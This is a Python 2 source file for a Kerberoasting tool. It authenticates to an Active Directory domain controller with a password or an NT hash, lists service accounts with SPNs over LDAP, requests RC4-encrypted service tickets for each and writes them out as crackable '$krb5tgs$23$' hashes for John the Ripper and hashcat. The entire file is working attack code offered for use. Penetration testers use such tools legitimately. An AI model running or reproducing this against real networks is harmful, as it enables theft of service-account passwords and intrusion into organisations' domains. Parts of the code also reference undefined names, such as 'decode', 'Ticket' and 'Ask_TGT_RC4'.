#!/usr/bin/python
# ----------------------------------------------------------------------------
# "THE BEER-WARE LICENSE" (Revision 42):
# <eddy (dot) maaalou (at) gmail (dot) com> wrote this file.  As long as you
# retain this notice you can do whatever you want with this stuff. If we meet
# some day, and you think this stuff is worth it, you can buy me a beer in
# return.   Fist0urs
# ----------------------------------------------------------------------------

# -*- coding: utf-8 -*-

# by Fist0urs

import sys, os
sys.path.append(os.path.realpath(os.path.dirname(__file__)+"./modules"))

import argparse
from random import getrandbits
from time import time, localtime, strftime
import datetime
from ldap3 import Server, Connection, SIMPLE, \
    SYNC, ALL, SASL, NTLM

import ldap3.core.exceptions

from rom.crypto import generate_subkey, ntlm_hash, RC4_HMAC, HMAC_MD5
from rom.krb5 import build_as_req, build_tgs_req, send_req, recv_rep, \
    decrypt_as_rep, decrypt_tgs_rep
from rom.ccache import CCache, kdc_rep2ccache
from rom.util import epoch2gt, gt2epoch


LDAP_PORT="389"

LDAP_QUERY = "(&\
              (objectClass=user)\
              (servicePrincipalName=*)\
              (!(objectClass=computer))\
              (!(cn=krbtgt))\
              )"

ATTRIBUTES_TO_RETRIEVE = ['sAMAccountName',
                          'servicePrincipalName',
                          'memberOf',
                          'primaryGroupID'
                         ]

ccache_file="/tmp/krb5cc_"

dico_etypes={'1':'des-cbc-crc',
             '2':'des-cbc-md4',
             '3':'des-cbc-md5',
             '5':'des3-cbc-md5',
             '7':'des3-cbc-sha1',
             '9':'dsaWithSHA1-CmsOID',
             '10':'md5WithRSAEncryption-CmsOID',
             '11':'sha1WithRSAEncryption-CmsOID',
             '12':'rc2CBC-EnvOID',
             '13':'rsaEncryption-EnvOID',
             '14':'rsaES-OAEP-ENV-OID',
             '15':'des-ede3-cbc-Env-OID',
             '16':'des3-cbc-sha1-kd',
             '17':'aes128-cts-hmac-sha1-96',
             '18':'aes256-cts-hmac-sha1-96',
             '23':'rc4-hmac',
             '24':'rc4-hmac-exp',
             '65':'subkey-keymaterial'}

# Console colors
W = '\033[0m'  # white (normal)
R = '\033[31m'  # red
G = '\033[32m'  # green
O = '\033[33m'  # orange
B = '\033[34m'  # blue
P = '\033[35m'  # purple
C = '\033[36m'  # cyan
GR = '\033[37m'  # gray

verbose_level = 0

class AttackParameters():
    def __init__(self, user_account = None, realm = None,
                DC_addr = None, password = None,
                sid = None, key = None,
                auth_gssapi = False, list_spn = None,
                tgt = None, session_key = None,
                logon_time = None, outputfile_path = None,
                time_delta = 0, as_data = {}
                ):

        self.user_account = user_account
        self.realm = realm
        self.DC_addr = DC_addr
        self.password = password
        self.sid = sid
        self.auth_gssapi = auth_gssapi
        self.key = key
        self.list_spn = list_spn
        self.outputfile_path = outputfile_path
        self.tgt = tgt
        self.session_key = session_key
        self.logon_time = logon_time
        self.time_delta = time_delta
        self.as_data = as_data

    # We ask a TGT with PAC when LDAP connection is made through gssapi
    def get_TGT(self, need_pac = False):
        DC_addr = self.DC_addr
        WRITE_STDOUT(G + "\nAsking " + B + '\'' + DC_addr\
                           + '\'' + G + " for a TGT\n" + W)

        WRITE_STDOUT('  [+] Building AS-REQ for %s...' % DC_addr)

        nonce = getrandbits(31)
        current_time = time() + self.time_delta

        as_req = build_as_req(self.realm, self.user_account,
                              self.key, current_time,
                              nonce, pac_request = need_pac
                              )

        WRITE_STDOUT(' Done!\n')

        WRITE_STDOUT('  [+] Sending AS-REQ to %s...' % DC_addr)
        sock = send_req(as_req, DC_addr)
        WRITE_STDOUT(' Done!\n')

        WRITE_STDOUT('  [+] Receiving AS-REP from %s...' % DC_addr)
        data = recv_rep(sock)
        WRITE_STDOUT(' Done!\n')

        WRITE_STDOUT('  [+] Parsing AS-REP from %s...' % DC_addr)
        as_rep, as_rep_enc = decrypt_as_rep(data, self.key)

        self.as_data["as_rep"]=as_rep
        self.as_data["as_rep_enc"] = as_rep_enc

        self.session_key = (int(as_rep_enc['key']['keytype']),\
                      str(as_rep_enc['key']['keyvalue']))

        self.logon_time = gt2epoch(str(as_rep_enc['authtime']))
        self.tgt = as_rep['ticket']
        WRITE_STDOUT(' Done!\n')

        WRITE_STDOUT(G + "TGT retrieved for user " + B + '\''\
                         + self.user_account + '\'\n' + W)


    def Parse_TGT_File(self, tgt_file):
        WRITE_STDOUT('\n' + P + '[+] Parsing TGT file '+ B + '\'' + tgt_file \
        + '\'\n' + W)
        tgt_cache_data = CCache.load(tgt_file)

        tgt_credentials =  tgt_cache_data.credentials[0]
        self.user_account = "".join(tgt_credentials.client.components)
        self.realm = tgt_credentials.client.realm
        self.session_key = (int(tgt_credentials.key.keytype), str(tgt_credentials.key.keyvalue))

        # in CCache format, cipher part is asn1 encoded
        self.tgt = decode(tgt_credentials.ticket, asn1Spec=Ticket())[0]

        WRITE_STDOUT('  [+] Extracting TGT and session key... Done!\n\n')

        if tgt_credentials.key.keytype != 23:
            WRITE_STDOUT(R + '[+] Warning, encryption type is '\
                        + B + '\'' + dico_etypes[str(tgt_credentials.key.keytype)]\
                        + '\'' + R + ' asking for a new TGT in RC4...\n' + W)
            self.tgt = self.Ask_TGT_RC4()

    def TGS_attack(self):
        WRITE_STDOUT('\n' + P + '[+] Iterating through SPN and building '\
                    + "corresponding TGS-REQ\n" + W)

        if self.outputfile_path != None:
            try:
                outputfile = open(self.outputfile_path,'w')
            except:
                WRITE_STDOUT(' cannot open \'%s\' exiting. \n' % self.outputfile_path)
                sys.exit(1)

        # Iterate through list_spn and forge TGS
        target_service = target_host = ""
        existing_SPN = 0

        for accounts in self.list_spn:
            spn = accounts['serviceprincipalname']
            samaccountname = accounts['samaccountname']
            target_service, target_host = spn.split('/', 1)

            # generate Kerberos pre-requesite
            subkey = generate_subkey()
            nonce = getrandbits(31)
            current_time = time() + self.time_delta

            # send custom TGS-REQ packet
            sock = self.forge_custom_TGS_REQ(target_service, target_host,
                                        subkey, nonce, current_time,
                                        spn, samaccountname
                                        )
            WRITE_STDOUT(' Done!\n')

            # analyse TGS-REP and extract rc4-ciphered ticket
            tgs_rep = parse_TGS_REP(sock, subkey, spn, samaccountname, self.DC_addr)[0]
            # Ticket is not rc4-ciphered
            if not tgs_rep:
                continue

            # horrible asn1 structure...
            c=""

            for i in tgs_rep['ticket']['enc-part']['cipher'].asNumbers():
                # zfill make sure a leading '0' is added when needed
                c =c + hex(i).replace("0x",'').zfill(2)
                existing_SPN = 1

            sys.stdout.write("$krb5tgs$23$*" + samaccountname + "$"\
                + self.DC_addr + "$" + target_service + "/" + target_host.split(':')[0] + "*$"\
                + c[:32] + "$" + c[32:] + '\n')
            sys.stdout.flush()

            if self.outputfile_path != None:
                outputfile.write("$krb5tgs$23$*" + samaccountname + "$"\
                + self.DC_addr + "$" + target_service + "/" + target_host.split(':')[0] + "*$"\
                + c[:32] + "$" + c[32:] + '\n')

        if self.outputfile_path != None:
            outputfile.close()
            # where are stored SPN
            dirname = os.path.dirname(self.outputfile_path)
            # current dir
            if dirname == '':
                dirname = './'
            else:
                dirname = dirname + '/'
            filename = os.path.basename(self.outputfile_path)
            filename = 'SPN_' + filename

        # All went good!
        if existing_SPN != 0:
            if self.outputfile_path != None:
                WRITE_STDOUT(O + "All done! All tickets are stored in a "\
                + "ready-to-crack format in " + B + '\'' + self.outputfile_path + '\''\
                + O + " and SPN are stored in " + B + '\'' + dirname + filename\
                + '\'\n' + W)
        else:
            sys.stderr.write(O + "There are no accounts with an SPN \n" + W)
            sys.stderr.flush()

    def forge_custom_TGS_REQ(self, target_service, target_host,
                             subkey, nonce, current_time, spn,
                             samaccountname):

        WRITE_STDOUT('  [+] Building TGS-REQ for SPN ' + B + '\'' + spn\
                +'\'' + W + ' and account ' + B + '\'' + samaccountname\
                + '\'' + W + '...')

        tgs_req = build_tgs_req(self.realm, target_service, target_host,
                                self.realm, self.user_account, self.tgt,
                                self.session_key, subkey, nonce,
                                current_time
                                )

        WRITE_STDOUT(' Done!\n  [+] Sending TGS-REQ to %s...' % self.DC_addr)
        return send_req(tgs_req, self.DC_addr)


def WRITE_STDOUT(message):
    if verbose_level == 1:
        sys.stdout.write(message)
        sys.stdout.flush()


def ldap_get_all_users_spn(AttackParameters, port):
    # build DN
    DN="DC="+",DC=".join(AttackParameters.realm.split('.'))

    # Kerberos authentication
    if AttackParameters.auth_gssapi :
        WRITE_STDOUT(G + "\nConnecting to " + B + '\'' + AttackParameters.DC_addr \
                    + '\'' + W + G + " using ldap protocol and"\
                    + " Kerberos authentication!\n" + W)

        WRITE_STDOUT('  [+] Creating ticket ccache file %r...' % ccache_file)
        cc = CCache((AttackParameters.realm, AttackParameters.user_account))
        tgt_cred = kdc_rep2ccache(AttackParameters.as_data["as_rep"], AttackParameters.as_data["as_rep_enc"])
        cc.add_credential(tgt_cred)
        cc.save(ccache_file)
        WRITE_STDOUT(' Done!\n')

        WRITE_STDOUT('  [+] Initiating ldap connection using ticket...')
        server = ldap3.Server(AttackParameters.DC_addr)
        c = ldap3.Connection(server, authentication=ldap3.SASL, sasl_mechanism='GSSAPI')
        WRITE_STDOUT(' Done!\n')

    # NTLM authentication
    else :
        WRITE_STDOUT(G + "Connecting to " + B + '\'' + AttackParameters.DC_addr + '\'' + W +\
                         G + " using ldap protocol and NTLM authentication!\n" + W)

        s = Server(AttackParameters.DC_addr, port=389, get_info=ALL)

        c = Connection(s,
                   auto_bind=False,
                   client_strategy=SYNC,
                   user=AttackParameters.realm+"\\"+AttackParameters.user_account,
                   password=AttackParameters.password,
                   authentication=NTLM,
                   check_names=True)

    # Now we should be connected to the DC through LDAP
    try :
        c.open()
    except ldap3.core.exceptions.LDAPSocketOpenError as e:
        WRITE_STDOUT(R + "ldap connection error: %s\n" % e + W)
        sys.exit(1)

    try :
        r = c.bind()
    except:
        WRITE_STDOUT(R + "Cannot connect to ldap, exiting.\n" + W)
        sys.exit(1)

    # Query to find all accounts having a servicePrincipalName
    attributes_to_retrieve = [x.lower() for x in ATTRIBUTES_TO_RETRIEVE]

    c.search(DN,
            LDAP_QUERY,
            search_scope='SUBTREE',
            attributes = attributes_to_retrieve
            )

    if not c.response:
        WRITE_STDOUT(R + "Cannot find any SPN, wrong user/credentials?\n" + W)
        sys.exit(1)

    WRITE_STDOUT('  [+] Retrieving all SPN and corresponding accounts...')

    # construct path to SPN_outfile to store LDAP response
    if AttackParameters.outputfile_path != None:
        outputfile_spn = ""
        dirname = os.path.dirname(AttackParameters.outputfile_path)
        # current dir
        if dirname == '':
            dirname = './'
        else:
            dirname = dirname + '/'
        filename = os.path.basename(AttackParameters.outputfile_path)
        filename = 'SPN_' + filename
        outputfile_spn = open(dirname + filename, 'w')

    # iterate through results to construc dico[{'attribute':'value'},{}, etc.] for each "{}" account
    dico_users_spn = []
    for matching_object in c.response:
        if matching_object.has_key('attributes'):
            dico_account={}
            for attribute, value in matching_object['attributes'].items():
                # delimiter of SPN is ';' in AD but ',' using ldap3 structures
                if attribute.lower() == "serviceprincipalname" and len(attribute) > 1:
                    # only need one SPN for the attack
                    value = value[0]
                if attribute.lower() in attributes_to_retrieve:
                    if type(value) is int:
                        dico_account[attribute.encode("utf8").lower()] = str(value)
                    else:
                        value = "".join(value).encode("utf8")
                        dico_account[attribute.encode("utf8").lower()] = value.lower()
            dico_users_spn.append(dico_account)

    # Disconnecting from DC
    WRITE_STDOUT(' Done!\n')
    c.unbind()
    WRITE_STDOUT(G + "Successfully disconnected from "+ B + '\''\
                 + AttackParameters.DC_addr + '\'\n' + W)

    # write to SPN_outputfile
    if AttackParameters.outputfile_path != None:
        for accounts in dico_users_spn:
            line_to_write = accounts['samaccountname']+'$'\
                            +accounts['serviceprincipalname']
            if accounts.has_key('memberof'):
                line_to_write = line_to_write + '$' + accounts['memberof']
            if accounts.has_key('primarygroupid'):
                line_to_write = line_to_write + '$primaryGroupID:'\
                                + accounts['primarygroupid']
            outputfile_spn.write(line_to_write + '\n')
        outputfile_spn.close()

    return dico_users_spn


def construct_list_spn_from_file(inputfile):
    dico_users_spn = []
    for line in inputfile:
        line_treated = line.strip().split('$')
        dico_users_spn.append({'samaccountname':line_treated[0],\
                        'serviceprincipalname':line_treated[1]})
    return dico_users_spn


def parse_TGS_REP(sock, subkey, spn, samaccountname, kdc_addr):
        WRITE_STDOUT('  [+] Receiving TGS-REP from %s...' % kdc_addr)
        data = recv_rep(sock)
        WRITE_STDOUT(' Done!\n')

        WRITE_STDOUT('  [+] Parsing TGS-REP from %s...' % kdc_addr)
        tgs_rep, tgs_rep_enc = decrypt_tgs_rep(data, subkey)

        # MAGIC, not RC4 received...
        if len(tgs_rep) == 2 and not tgs_rep_enc:
            WRITE_STDOUT(R + ' Only rc4-hmac supported and encryption type\
                            is \'%s\'. Skipping this account...\n\n' %\
                            dico_etypes[tgs_rep] + W)
            return None, None
        else:
            WRITE_STDOUT(' Done!\n' + G + '  [+] Got encrypted ticket for SPN '\
                     + B + '\'' + spn + '\'' + G + ' and account ' + B + '\''\
                     + samaccountname + '\'\n' + W)
            return tgs_rep, tgs_rep_enc


def parse_arguments():
    parser = argparse.ArgumentParser(description="Script to retrieve all accounts\
    having an SPN and retrieving their TGS in rc4-hmac encrypted blob in John The Ripper\
    'krb5tgs' format and hashcat's one, by Fist0urs")

    group = parser.add_mutually_exclusive_group(required=False)
    group2 = parser.add_mutually_exclusive_group(required=False)

    parser.add_argument('-u', '--username', required=True, help="format must be\
    userName@DomainFQDN. eg: fistouille@infra.kerberos.com")

    parser.add_argument('-d', '--domainControlerAddr', required=True, help="domain\
    Controler FQDN. Can be an IP but ldap retrieval through kerberos method will not\
    work (-k)")

    parser.add_argument('-o', '--outputfile', required=False, help="outputfile where\
    to store results")

    parser.add_argument('-iK', '--input_TGT_File', required=False, help="user's provided file\
    containing TGT. Parsing is determined by extension (.ccache for Linux\
    , Windows is yet to be implemented)")

    group.add_argument('-p', '--password', required=False, help="clear password\
    submitted. Cannot be used with '--hash'")

    group.add_argument('--hash', required=False, help="user's hash key. Format is \"LM:NT\".\
    Cannot be used with '-p'")

    parser.add_argument('-v', '--verbose', required=False, action='store_const', const=1,
    help="increase verbosity level")

    parser.add_argument('--delta', required=False,
    help="set time delta in Kerberos tickets. Useful when DC is not on the same timezone.\
    Format is \"(+/-)hours:minutes:seconds\", eg. --delta=\"+00:05:00\" or --delta=\"-02:00:00\"")

    group2.add_argument('-k', '--user_sid', required=False, help="force ldap SPN\
    retrieval through kerberos, sid is mandatory. Cannot be used with '-i'")

    group2.add_argument('-i', '--inputfile_spn', required=False, help="retrieve\
    TGS associated with SPN in user's provided file. Format must be 'samaccountname$spn'\
    on each line, 'samaccountname' can be 'unknown'")

    options = parser.parse_args()
    if not any(vars(options).values()):
        parser.print_help()
        sys.exit(1)
    return options


if __name__ == '__main__':
    from getpass import getpass

    options = parse_arguments()
    user_name, user_realm = options.username.split('@', 1)

    DataSubmitted = AttackParameters(DC_addr = options.domainControlerAddr.lower(),
                                 user_account = user_name,
                                 realm = user_realm.upper(),
                                 outputfile_path = options.outputfile)

    ccache_file = ccache_file + str(os.geteuid())

    if options.password :
        DataSubmitted.password = options.password
        DataSubmitted.key = (RC4_HMAC, ntlm_hash(DataSubmitted.password).digest())
    elif options.hash:
        lm_hash, nt_hash = options.hash.split(':')
        # assume right format
        if len(lm_hash) != 32 or len(nt_hash) != 32:
            WRITE_STDOUT("Error: format must be \"LM:NT\"")
            sys.exit(1)
        DataSubmitted.key = (RC4_HMAC, nt_hash.decode('hex'))
        DataSubmitted.password = options.hash
        assert len(DataSubmitted.key[1]) == 16
    else:
        DataSubmitted.password = getpass('Password: ')
        DataSubmitted.key = (RC4_HMAC, ntlm_hash(DataSubmitted.password).digest())

    if options.user_sid :
        DataSubmitted.sid = options.user_sid
        DataSubmitted.auth_gssapi = True
    elif options.inputfile_spn :
        try:
            inputfile_spn = open(options.inputfile_spn, 'r')

            WRITE_STDOUT(G + "Retrieving sAMAccountName "\
                            + "and servicePrincipalName from file " \
                            + B + '\'' + options.inputfile_spn +\
                            '\'' + W + G + "..." + W)

            DataSubmitted.list_spn = construct_list_spn_from_file(inputfile_spn)
            WRITE_STDOUT(" Done!\n")
        except:
            WRITE_STDOUT(R + "Cannot open " + B + '\'' + \
                            options.inputfile_spn + '\', exiting\n' + W)
            sys.exit(1)

    if options.input_TGT_File :
        DataSubmitted.Parse_TGT_File(options.input_TGT_File)

    if options.verbose:
        verbose_level = 1

    if options.delta:
        sign = options.delta[0]
        time_array = map(int, options.delta[1:].split(':'))

        if sign == '+':
            DataSubmitted.time_delta = datetime.timedelta(hours=time_array[0], minutes=time_array[1], seconds=time_array[2]).total_seconds()
        elif sign == '-':
            DataSubmitted.time_delta = - datetime.timedelta(hours=time_array[0], minutes=time_array[1], seconds=time_array[2]).total_seconds()
        else:
            sys.stderr.write(O + "Sign must be '+' or '-'. Exiting. \n" + W)
            sys.stderr.flush()
            sys.exit(1)

    # launching attack!

    # file containing SPN is provided
    if DataSubmitted.list_spn:
        if not DataSubmitted.tgt:
            DataSubmitted.get_TGT()
        DataSubmitted.TGS_attack()
    else:
        # authentification through Kerberos
        if DataSubmitted.auth_gssapi:
            if not DataSubmitted.tgt:
                DataSubmitted.get_TGT(need_pac = True)
            DataSubmitted.list_spn = ldap_get_all_users_spn(DataSubmitted, LDAP_PORT)
            DataSubmitted.TGS_attack()
        # authentification through NTLM
        else:
            DataSubmitted.list_spn = ldap_get_all_users_spn(DataSubmitted, LDAP_PORT)
            if not DataSubmitted.tgt:
                DataSubmitted.get_TGT()
            DataSubmitted.TGS_attack()
